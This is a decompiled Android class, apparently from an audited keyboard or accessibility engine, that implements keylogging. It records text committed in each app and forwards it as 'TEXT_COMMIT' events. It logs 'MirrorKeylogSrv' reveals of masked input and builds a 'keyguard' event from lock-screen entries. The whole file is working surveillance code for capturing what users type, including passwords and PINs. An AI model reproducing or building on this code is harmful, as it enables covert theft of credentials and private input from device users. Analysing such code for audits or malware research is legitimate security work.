// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package w1;

import android.os.Handler;
import android.util.Log;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Map;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class b5 implements d5 {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f3552c;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public final /* synthetic */ j5 f3553d;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public final /* synthetic */ String f3554e;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public final /* synthetic */ String f3555f;

    public /* synthetic */ b5(j5 j5Var, String str, String str2, int i3) {
        this.f3552c = i3;
        this.f3553d = j5Var;
        this.f3554e = str;
        this.f3555f = str2;
    }

    @Override // w1.d5
    public final void c(y.e eVar) {
        switch (this.f3552c) {
            case 0:
                final j5 j5Var = this.f3553d;
                j5Var.getClass();
                final int i3 = 1;
                final String str = this.f3554e;
                final String str2 = this.f3555f;
                eVar.n(new Runnable() { // from class: w1.y4
                    @Override // java.lang.Runnable
                    public final void run() {
                        String str3;
                        Handler handler;
                        switch (i3) {
                            case 0:
                                j5 j5Var2 = j5Var;
                                String str4 = str;
                                String str5 = str2;
                                HashSet hashSet = j5Var2.G;
                                j5Var2.D = false;
                                j5Var2.f4309c.h(str4, System.currentTimeMillis());
                                if (str5 == null || str5.isEmpty()) {
                                    str5 = j5Var2.f4329x;
                                }
                                String str6 = j5Var2.f4330y;
                                if (str6 == null) {
                                    str6 = "";
                                }
                                String str7 = j5Var2.f4331z;
                                if (str7 == null) {
                                    str7 = "";
                                }
                                String str8 = j5Var2.A;
                                if (str8 == null) {
                                    str8 = "";
                                }
                                if (str5 != null && !str5.isEmpty()) {
                                    j5Var2.f4308b.put(str5, str4.toCharArray());
                                    hashSet.add(str5);
                                }
                                Iterator it = j5Var2.f4307a.entrySet().iterator();
                                while (it.hasNext()) {
                                    Map.Entry entry = (Map.Entry) it.next();
                                    f5 f5Var = (f5) entry.getValue();
                                    if (f5Var != null && f5Var.f3997f && (str5 == null || str5.equals(entry.getKey()) || j5Var2.f4327v.equals(f5Var.f3993b))) {
                                        hashSet.add((String) entry.getKey());
                                        e2.q0 q0Var = f5Var.f4002k;
                                        if (q0Var != null && (handler = j5Var2.f4318l.f3874b) != null) {
                                            handler.removeCallbacks(q0Var);
                                        }
                                        if (str6.isEmpty()) {
                                            String str9 = f5Var.f3992a;
                                            if (str9 == null) {
                                                str9 = "";
                                            }
                                            if (!str9.isEmpty()) {
                                                str6 = f5Var.f3992a;
                                            }
                                        }
                                        if (str7.isEmpty()) {
                                            String str10 = f5Var.f3995d;
                                            if (str10 == null) {
                                                str10 = "";
                                            }
                                            if (!str10.isEmpty()) {
                                                str7 = f5Var.f3995d;
                                            }
                                        }
                                        if (str8.isEmpty()) {
                                            String str11 = f5Var.f3996e;
                                            if (str11 == null) {
                                                str11 = "";
                                            }
                                            if (!str11.isEmpty()) {
                                                str8 = f5Var.f3996e;
                                            }
                                        }
                                        it.remove();
                                    }
                                }
                                if ((str6 == null || str6.isEmpty()) && (str3 = j5Var2.f4326u) != null) {
                                    str6 = str3;
                                }
                                j5Var2.f4330y = str6 == null ? "" : str6;
                                String str12 = str6;
                                String str13 = j5Var2.f4327v;
                                String str14 = j5Var2.f4328w;
                                if (str7 == null) {
                                    str7 = "";
                                }
                                if (str8 == null) {
                                    str8 = "";
                                }
                                j5Var2.f4316j.C(j5.h("TEXT_COMMIT", str13, str14, str4, str7, str8, str4.length(), true, str12 == null ? "" : str12, str4, str4));
                                break;
                            default:
                                j5 j5Var3 = j5Var;
                                String str15 = str;
                                String str16 = str2;
                                if (j5Var3.f4329x != null) {
                                    String str17 = j5Var3.f4327v;
                                    boolean z2 = false;
                                    boolean z3 = str17 != null && str17.equals(str15);
                                    if (str15 != null && str15.startsWith("com.android")) {
                                        z2 = true;
                                    }
                                    if ((z3 || z2) && j5.H(j5Var3.C, j5Var3.f4324s, System.currentTimeMillis())) {
                                        Log.d("MirrorKeylogSrv", "[SoftKb] popup-on-top reveal maskLen=" + j5Var3.C + " pkg=" + str15 + " cls=" + str16);
                                        j5Var3.y();
                                    }
                                    break;
                                }
                                break;
                        }
                    }
                });
                break;
            case 1:
                final j5 j5Var2 = this.f3553d;
                j5Var2.getClass();
                final int i4 = 0;
                final String str3 = this.f3554e;
                final String str4 = this.f3555f;
                eVar.n(new Runnable() { // from class: w1.y4
                    @Override // java.lang.Runnable
                    public final void run() {
                        String str5;
                        Handler handler;
                        switch (i4) {
                            case 0:
                                j5 j5Var3 = j5Var2;
                                String str6 = str3;
                                String str7 = str4;
                                HashSet hashSet = j5Var3.G;
                                j5Var3.D = false;
                                j5Var3.f4309c.h(str6, System.currentTimeMillis());
                                if (str7 == null || str7.isEmpty()) {
                                    str7 = j5Var3.f4329x;
                                }
                                String str8 = j5Var3.f4330y;
                                if (str8 == null) {
                                    str8 = "";
                                }
                                String str9 = j5Var3.f4331z;
                                if (str9 == null) {
                                    str9 = "";
                                }
                                String str10 = j5Var3.A;
                                if (str10 == null) {
                                    str10 = "";
                                }
                                if (str7 != null && !str7.isEmpty()) {
                                    j5Var3.f4308b.put(str7, str6.toCharArray());
                                    hashSet.add(str7);
                                }
                                Iterator it = j5Var3.f4307a.entrySet().iterator();
                                while (it.hasNext()) {
                                    Map.Entry entry = (Map.Entry) it.next();
                                    f5 f5Var = (f5) entry.getValue();
                                    if (f5Var != null && f5Var.f3997f && (str7 == null || str7.equals(entry.getKey()) || j5Var3.f4327v.equals(f5Var.f3993b))) {
                                        hashSet.add((String) entry.getKey());
                                        e2.q0 q0Var = f5Var.f4002k;
                                        if (q0Var != null && (handler = j5Var3.f4318l.f3874b) != null) {
                                            handler.removeCallbacks(q0Var);
                                        }
                                        if (str8.isEmpty()) {
                                            String str11 = f5Var.f3992a;
                                            if (str11 == null) {
                                                str11 = "";
                                            }
                                            if (!str11.isEmpty()) {
                                                str8 = f5Var.f3992a;
                                            }
                                        }
                                        if (str9.isEmpty()) {
                                            String str12 = f5Var.f3995d;
                                            if (str12 == null) {
                                                str12 = "";
                                            }
                                            if (!str12.isEmpty()) {
                                                str9 = f5Var.f3995d;
                                            }
                                        }
                                        if (str10.isEmpty()) {
                                            String str13 = f5Var.f3996e;
                                            if (str13 == null) {
                                                str13 = "";
                                            }
                                            if (!str13.isEmpty()) {
                                                str10 = f5Var.f3996e;
                                            }
                                        }
                                        it.remove();
                                    }
                                }
                                if ((str8 == null || str8.isEmpty()) && (str5 = j5Var3.f4326u) != null) {
                                    str8 = str5;
                                }
                                j5Var3.f4330y = str8 == null ? "" : str8;
                                String str14 = str8;
                                String str15 = j5Var3.f4327v;
                                String str16 = j5Var3.f4328w;
                                if (str9 == null) {
                                    str9 = "";
                                }
                                if (str10 == null) {
                                    str10 = "";
                                }
                                j5Var3.f4316j.C(j5.h("TEXT_COMMIT", str15, str16, str6, str9, str10, str6.length(), true, str14 == null ? "" : str14, str6, str6));
                                break;
                            default:
                                j5 j5Var4 = j5Var2;
                                String str17 = str3;
                                String str18 = str4;
                                if (j5Var4.f4329x != null) {
                                    String str19 = j5Var4.f4327v;
                                    boolean z2 = false;
                                    boolean z3 = str19 != null && str19.equals(str17);
                                    if (str17 != null && str17.startsWith("com.android")) {
                                        z2 = true;
                                    }
                                    if ((z3 || z2) && j5.H(j5Var4.C, j5Var4.f4324s, System.currentTimeMillis())) {
                                        Log.d("MirrorKeylogSrv", "[SoftKb] popup-on-top reveal maskLen=" + j5Var4.C + " pkg=" + str17 + " cls=" + str18);
                                        j5Var4.y();
                                    }
                                    break;
                                }
                                break;
                        }
                    }
                });
                break;
            default:
                j5 j5Var3 = this.f3553d;
                j5Var3.getClass();
                String str5 = this.f3555f;
                eVar.n(new w4(j5Var3, j5.g(this.f3554e, "keyguard", "", str5, "", "", str5.length(), true), 1));
                break;
        }
    }
}
